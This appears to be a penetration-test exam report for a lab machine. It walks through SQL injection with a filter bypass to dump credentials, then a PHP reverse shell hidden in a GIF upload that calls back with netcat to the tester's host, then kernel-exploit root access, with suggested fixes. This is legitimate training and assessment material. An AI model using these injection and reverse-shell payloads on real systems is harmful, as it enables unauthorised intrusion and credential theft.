### System IP: 10.10.10.31

#### Service Enumeration

Protocol | Ports Open
------------------|----------------------------------------
**TCP** | 22,80
**UDP** | N/A

**Nmap Scan Results:**

```
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
```

**Vulnerability Explanation:**

After enumeration of the Apache webserver we discovered multiple SQL injection vulnerabilities in the web application which allowed us to gain access to user credentials that we were then able to use to gain access via a reverse shell embedded inside an image file. 

After fuzzing we found a directory called `/cmsdata/` which we did some additional fuzzing on and found a `login.php` page that we were able to view. 

When testing parameters on the "Forgot Password" function we noted that we were able to cause a database error by providing a single quote as part of our input:

![database_error](/root/SharedFolder/SundayExamMock/screenshots/10.10.10.31/database_error.png)

After some testing we found that we were able to perform Union injection attacks against the target, the UNION keyword was filtered, so we were bypassed this by using `UNion` instead.

```
1@2.com' UNion SELECT 1,2,3,4-- -
```

After some experimentation with the way the server was handling our injection we managed to determine that providing a valid email address format as a part of one of the injection fields allowed us to use the `group_concat` function to inject a payload in the place of the first part of our email address. (i.e. version()@someemail.com)

We then started to enumerate the values we had to work with for our injection. 

```
email=1@2.com' UNion SELECT NULL,NULL,NULL,concat(version(), "--@yomamma.com")-- -
```

![POC Injection](/root/SharedFolder/SundayExamMock/screenshots/10.10.10.31/sql_proper_poc.png)

As can be seen above our payload is returned as part of the "Sent to someone@emailaddress.com" output. 

Once we had a solid POC we enumerated the database until we located a table with some user credentials and were then able to dump the contents of this table:

![Password Dump](/root/SharedFolder/SundayExamMock/screenshots/10.10.10.31/username_password_dump.png)

There was too much data in this and most of it looked useless, so we filtered the output.

```
email=1@2.com' UNion SELECT 1,2,3,concat(__username_, "||" , __password_, "--@yomamma.com") from operators limit 200,1-- -
```

Eventually we dumped out the `super_cms_adm` user password, which we were able to find a matching hash for on Google.

![super_cms_password_cracked]()

Once we logged into the system we did some mroe enumeration and noticed that there was an image upload function. 

![upload_function](/root/SharedFolder/SundayExamMock/screenshots/10.10.10.31/image_upload.png)

Viewing the source of the image upload page we noticed a disabled form field that we were enable to re-enable by modifying the HTML.

After some experimentation we determined that the hidden form field allowed us to override the uploaded file name and upload whatever we liked in it's place:

![successful_upload](/root/SharedFolder/SundayExamMock/screenshots/10.10.10.31/modeified_form_contents.png)

This allowed us to upload an "image" with a malicious PHP payload inside:

![successful_upload](/root/SharedFolder/SundayExamMock/screenshots/10.10.10.31/FINALLY.png)

The "image" we uploaded contained the following code:

```
GIF87a;
<?php
system('mknod /tmp/backpipe p; /bin/sh 0< /tmp/backpipe | nc 10.10.14.4 4444 1> /tmp/backpipe; rm /tmp/backpipe');
?>
```

We included the "magic bytes" of `GIF87a` to trick the system into seeing the file as a GIF image. 

After uploading our image to the server we then visited the address that it gave us upon successful upload to trigger our reverse shell as the PHP code inside our "image" will be processed and executed on the server. 


**Vulnerability Fix:** Ensure that user input is sanitised to prevent SQL injection and make use of parameterised queries to further increase protections against this form of attack. Additionally ensure that any upload function does not allow for malicious code to be uploaded as part of an upload request, and if user uploads must be accepted limit the access to these files to prevent them from being used as exploit triggers.

**Severity:** High

**Local.txt Proof Screenshot**

![user shell](/root/SharedFolder/SundayExamMock/screenshots/10.10.10.31/user_shell.png)

**Local.txt Contents**

0fab3fb74e821f8ad05ee35b27f0d75e

#### Privilege Escalation

*Additional Priv Esc info*

**Vulnerability Exploited:**

After enumerating the files in the `decoder` users home directory (which we had access to as the www-data user) we discovered two files, decoder.pub, and pass.crypt:

![decoder_files](/root/SharedFolder/SundayExamMock/screenshots/10.10.10.31/decoder_files.png)

We used RSACTFTool to decipher the public key and extract the password from it:

![extracted_password](/root/SharedFolder/SundayExamMock/screenshots/10.10.10.31/rsa_ctf_tool_crack.png)

We then used this password to get access via SSH as the `decoder` user.

From here we enumerated the possible vulnerabilities and after running a tool called `linux-exploit-suggester` we found that the target system was vulnerable to CVE-2017-16995 aka "get-rekt".

We grabbed a copy of the public exploit from the following address:

[cve-2017-16995 exploit code](https://www.exploit-db.com/raw/45010)

Compiled it on the target machine (as GCC was available):

![compiling](/root/SharedFolder/SundayExamMock/screenshots/10.10.10.31/compiling.png)

We then executed the resulting binary and were able to gain a root shell on the target. 

**Vulnerability Fix:** Adopt better access control policies to prevent service accounts from reading the contents of users home directories. And upgrade the Linux kernel to a newer version which has patched this vulnerability. 

**Severity:** Critical

**Proof Screenshot Here:**

![root_proof](/root/SharedFolder/SundayExamMock/screenshots/10.10.10.31/root_proof.png)

**Proof.txt Contents:**

c59a840463acc6ca14f6599721c9c18e

